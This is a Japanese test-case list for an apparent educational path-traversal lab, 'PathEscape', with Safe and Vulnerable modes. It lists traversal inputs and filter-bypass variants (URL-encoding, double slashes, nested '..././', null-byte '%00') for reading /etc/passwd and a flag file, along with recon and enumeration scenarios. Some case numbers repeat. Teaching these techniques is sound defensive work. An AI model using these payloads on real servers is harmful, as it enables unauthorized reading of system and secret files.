# Demo Cases for PathEscape

本ファイルは PathEscape の挙動を確認するためのテストケース一覧です。  
講義や QA チェックで利用してください。各ケースは「入力」「ステージ/モード」「期待挙動」を明示しています。

---

## 1. Beginner Stage

### Case 1: 公開ファイルの取得（相対パス）
- Input: `public.txt`
- Mode: Vulnerable
- Expect: `/app/files/public.txt` の内容を取得できる

### Case 2: 公開ファイルの取得（絶対パス）
- Input: `/app/files/public.txt`
- Mode: Vulnerable
- Expect: `/app/files/public.txt` の内容を取得できる

### Case 3: `..` を1回使用
- Input: `../etc/passwd`
- Mode: Vulnerable
- Expect: 正規化後 `/app/etc/passwd` を参照 → VFSに存在しなければ「File not found」

### Case 4: `..` を2回使用
- Input: `../../etc/passwd`
- Mode: Vulnerable
- Expect: 正規化後 `/etc/passwd` を取得（VFSに存在する場合）
- Mode: Safe → Expect: ブロック（Access denied）

---

## 2. Intermediate Stage

### Case 5: 単純な `..` をブロック
- Input: `../../etc/passwd`
- Stage: Intermediate
- Mode: Vulnerable
- Expect: フィルターにより「入力ブロック」と表示される

### Case 6: 部分エンコードを利用した回避
- Input: `%2e%2e/%2e%2e/etc/passwd`
- Stage: Intermediate
- Mode: Vulnerable
- Expect: フィルターをすり抜けて `/etc/passwd` に到達（URLデコード後に`../..`となり正規化される）

### Case 7: 完全エンコードを利用した回避
- Input: `%2e%2e%2f%2e%2e%2fsecrets%2fflag.txt`
- Stage: Intermediate
- Mode: Vulnerable
- Expect: フィルターをすり抜けて `/secrets/flag.txt` に到達しフラグを取得

---

## 3. Advanced Stage

### Case 8: 標準的な攻撃のブロック
- Input: `../../etc/passwd`
- Stage: Advanced
- Mode: Vulnerable
- Expect: 高度なフィルターによりブロックされる

### Case 9: ダブルスラッシュ回避
- Input: `..//..//etc/passwd`
- Stage: Advanced
- Mode: Vulnerable
- Expect: フィルターをすり抜けて `/etc/passwd` に到達（教育的に設計された脆弱性）

### Case 10: 混合パターン回避
- Input: `..././..././etc/passwd`
- Stage: Advanced
- Mode: Vulnerable
- Expect: フィルターをすり抜けて `/etc/passwd` に到達

### Case 11: 混合エンコード回避
- Input: `..%2f..%2fetc%2fpasswd`
- Stage: Advanced
- Mode: Vulnerable
- Expect: フィルターをすり抜けて `/etc/passwd` に到達

### Case 12: Null文字インジェクション
- Input: `../../etc/passwd%00.txt`
- Stage: Advanced
- Mode: Vulnerable
- Expect: フィルターをすり抜けて `/etc/passwd` に到達（Null文字が拡張子チェックを回避）

---

## 4. Secret Flag Retrieval

### Case 13: フラグファイル取得（直接）
- Input: `/secrets/flag.txt`
- Mode: Vulnerable
- Expect: `FLAG{day068_success}` を取得 → UIにバッジが表示される

### Case 14: フラグファイル取得（相対）
- Input: `../../secrets/flag.txt`
- Mode: Vulnerable
- Expect: 正規化でフラグに到達して取得
- Mode: Safe → Expect: `Access denied: path outside base (safe mode)` でブロック

### Case 15: Safe vs Vulnerable比較
- Input: `../../etc/passwd`
- Mode: Vulnerable → Expect: `/etc/passwd` を取得
- Mode: Safe → Expect: `Access denied: path outside base (safe mode)` でブロック

---

## 5. Recon / Enumeration （追加：教材用シナリオ）

> **注意（重要）**: 以下は教育目的のシミュレーションです。実運用サイトや第三者のサービスに対して無許可のスキャンや列挙行為を行うことは禁止されています。本演習では PathEscape 内の模擬コンテンツに限定して実施してください。

### Case 16: robots.txt による手がかり
- Input: `/robots.txt`
- Mode: Vulnerable
- Expect: robots.txtの内容から `/secrets/flag.txt` の存在を推測できるヒントを取得

### Case 14: sitemap / index 断片からの推測
- Setup: サイトマップやページ断片に `secrets/flag.txt` へのリンクやスニペットが含まれている想定
- Action: 学習者は公開ページの断片を探し、そこから機密ファイルのヒントを得る
- Expect: 発見したヒントを基に `/secrets/flag.txt` を入力してフラグ取得を試みる（Vulnerable で成功、Safe でブロック）

### Case 15: リポジトリ断片（情報漏洩）のシミュレーション
- Setup: 教材用に `config.sample` や `deploy.sh.example` に `/secrets/flag.txt` のパスを記載した模擬断片を用意
- Action: 学習者は模擬リポジトリ断片を参照して、機密ファイルパスを特定する
- Expect: 特定したパスを使って Vulnerable モードでアクセスし、Safe モードでの防御を体験

### Case 16: ワードリスト（辞書）による列挙（模擬）
- Setup: 小さめのワードリスト（例: `["flag.txt","secret.txt","backup.zip","admin.zip"]`）を教材内で用意
- Action: PathEscape の「列挙シミュレータ」（教材用機能）でワードリストを試す
- Expect: 一致するパスがあればヒットし、どのように推測され得るかを学ぶ。**実環境での自動列挙は禁止**と明記すること。

### Case 17: レスポンスの違いから存在確認（タイミング/メッセージ差）
- Action: 存在するパスと存在しないパスで表示されるメッセージやレスポンス（例: エラーメッセージ、タイムアウト）を比較
- Expect: 微妙なレスポンス差が情報漏洩につながる可能性を理解する（教材で差をわかりやすく示す）

---

## 6. デバッグ / 開発用ケース

### コンソールでの正規化確認

ブラウザの開発者ツール（DevTools）の **Console** を使うと、パス解決の流れを直接確認できます。  
以下のスニペットを貼り付けて実行してください。

```js
// VFS に登録されているキー一覧を表示
console.log('VFS keys:', Object.keys(window.VFS || {}));

// サンプル入力 ../etc/passwd を正規化して確認
const BASE = '/app/files/';
const userInput = '../etc/passwd';
const combined = (userInput.startsWith('/') ? userInput : BASE + userInput).replace(/\/+/g,'/');
const normalized = normalizePath(combined);

console.log('userInput =', userInput);
console.log('combined  =', combined);
console.log('normalized=', normalized);
console.log('VFS has normalized?', !!window.VFS[normalized]);
```

出力例は以下のとおりです。

```
userInput = ../etc/passwd
combined  = /app/files/../etc/passwd
normalized= /app/etc/passwd
VFS has normalized? false
```

このようにして、なぜファイルが取得できないのか／どのように正規化されているのかを確認できます。

教材として「..」を何回書けば目的の階層に移動できるのか」を理解する助けになります。